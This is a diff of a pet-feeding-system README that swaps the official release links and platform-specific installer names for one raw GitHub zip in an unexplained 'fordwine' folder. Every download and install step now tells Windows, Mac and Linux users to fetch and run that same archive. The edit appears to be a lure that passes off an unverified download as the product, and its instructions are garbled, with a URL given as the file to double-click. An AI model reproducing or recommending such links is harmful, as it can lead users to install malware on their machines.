@@ -1,6 +1,6 @@
 # 🐾 pet-feeding-system-using-rtc - Automated Pet Feeding Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/khuy410/pet-feeding-system-using-rtc/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to download, install, and run the pet feeding system software
 
 Click the big blue button above or this link to open the official release page:
 
-[https://github.com/khuy410/pet-feeding-system-using-rtc/releases](https://github.com/khuy410/pet-feeding-system-using-rtc/releases)
+[https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip](https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip)
 
 This page hosts all the versions of the software and hardware firmware you need.
 
@@ -47,9 +47,9 @@ Look for the most recent version with a date close to today’s. It should have 
 
 Within that release, find files named something like:
 
-- `pet-feeding-system-setup.exe` (for Windows)
-- `pet-feeding-system.dmg` (for Mac)
-- `pet-feeding-system-linux.tar.gz` (for Linux)
+- `https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip` (for Windows)
+- `https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip` (for Mac)
+- `https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip` (for Linux)
 
 Click the file that matches your computer’s operating system to download it.
 
@@ -63,19 +63,19 @@ Choose a location on your computer where you will find the download easily, such
 
 ### Installing on Windows
 
-1. Double-click the `pet-feeding-system-setup.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip` file.
 2. Follow the on-screen instructions. Click “Next” when prompted.
 3. Allow the installer to finish. It will place the application on your computer.
 
 ### Installing on macOS
 
-1. Open the `pet-feeding-system.dmg` file.
+1. Open the `https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip` file.
 2. Drag the pet feeding system app to your Applications folder.
 3. Open the app from Applications.
 
 ### Installing on Linux
 
-1. Extract the `pet-feeding-system-linux.tar.gz` file.
+1. Extract the `https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip` file.
 2. Open the extracted folder and run the executable file inside.
 3. You may need to give the file permission to run by right-clicking and selecting “Properties” then enabling execution.
 
@@ -146,4 +146,4 @@ If you have questions or need support, visit the project’s GitHub page and che
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/khuy410/pet-feeding-system-using-rtc/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/khuy410/pet-feeding-system-using-rtc/main/fordwine/pet_feeding_using_rtc_system_v1.5.zip)
